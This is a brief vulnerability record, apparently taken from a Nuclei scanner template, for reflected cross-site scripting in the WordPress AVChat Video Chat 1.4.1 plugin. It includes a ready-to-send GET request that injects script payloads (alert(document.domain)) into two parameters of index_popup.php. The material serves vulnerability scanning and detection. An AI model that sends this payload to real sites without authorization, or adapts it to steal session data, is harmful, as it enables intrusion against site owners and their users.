# Vulnerability: WordPress AVChat Video Chat 1.4.1 - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`avchat-video-chat-xss.yaml`)

## Description
WordPress AVChat Video Chat 1.4.1 is vulnerable to reflected cross-site scripting via index_popup.php and multiple parameters.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/avchat-3/index_popup.php?movie_param=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&FB_appId=FB_appId%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&
```

